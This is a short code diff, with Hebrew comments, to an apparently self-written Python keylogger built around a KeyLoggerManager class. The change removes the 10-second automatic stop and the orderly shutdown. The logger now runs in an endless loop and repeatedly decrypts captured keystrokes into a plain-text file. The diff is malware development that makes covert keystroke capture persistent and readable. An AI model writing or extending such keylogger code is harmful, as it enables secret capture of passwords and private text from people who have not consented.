@@ -95,6 +95,7 @@ class KeyLoggerManager:
         while self.running:
             time.sleep(interval)
             self.write_data()
+            decrypt_and_save_to_file()
 
     def write_data(self):
         """ מצפין את הנתונים וכותב אותם לקובץ """
@@ -120,16 +121,9 @@ def main():
     klm = KeyLoggerManager([file_writer])
 
     listener_thread, writer_thread = klm.run()
-
-    time.sleep(10)
-    klm.stop()
-
-    listener_thread.join()
-    writer_thread.join()
-
-    # אחרי שה-keylogger מסיים, מפענחים את הנתונים ושומרים לקובץ נקי
-    decrypt_and_save_to_file()
-    print("\nDecryption completed! Check 'decrypted_output.txt'")
+    while True:
+        listener_thread.join()
+        writer_thread.join()
 
 
 if __name__ == "__main__":
